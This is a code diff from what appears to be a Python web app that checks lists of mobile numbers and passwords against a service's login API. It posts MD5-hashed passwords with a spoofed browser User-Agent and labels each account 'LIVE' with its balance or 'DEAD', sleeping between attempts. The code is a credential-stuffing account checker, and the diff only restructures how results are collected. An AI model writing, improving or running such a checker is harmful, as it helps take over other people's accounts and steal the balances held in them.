@@ -34,38 +34,28 @@ def check():
 
         hashed = md5(password)
 
-        headers = {"User-Agent": "Mozilla/5.0"}
-
-        params = {"mobile": mobile, "password": hashed}
-
-        status = "ERROR"
-        balance = "-"
-        remark = "Unknown Error"
-
         try:
-            r = requests.post(BASE + "login", params=params, headers=headers, timeout=12)
+            r = requests.post(BASE + "login", 
+                            params={"mobile": mobile, "password": hashed}, 
+                            headers={"User-Agent": "Mozilla/5.0"}, 
+                            timeout=10)
             
             if r.status_code == 200:
                 res = r.json()
                 if res.get("res") == 1:
                     balance = res.get("obj", {}).get("balance", 0)
-                    status = "✅ LIVE"
+                    results.append([mobile, "✅ LIVE", balance, "Success"])
                     live += 1
-                    remark = "Success"
                 else:
-                    status = "❌ DEAD"
-                    remark = res.get("resMsg", "")
+                    results.append([mobile, "❌ DEAD", "-", res.get("resMsg", "")])
             else:
-                status = "❌ DEAD"
-                remark = f"HTTP {r.status_code}"
+                results.append([mobile, "❌ DEAD", "-", f"HTTP {r.status_code}"])
         except Exception as e:
-            remark = str(e)
+            results.append([mobile, "❌ ERROR", "-", str(e)[:100]])
 
-        results.append([mobile, status, balance, remark])
         time.sleep(5)
 
     return jsonify({
-        "status": "done",
         "live": live,
         "total": len(results),
         "results": results
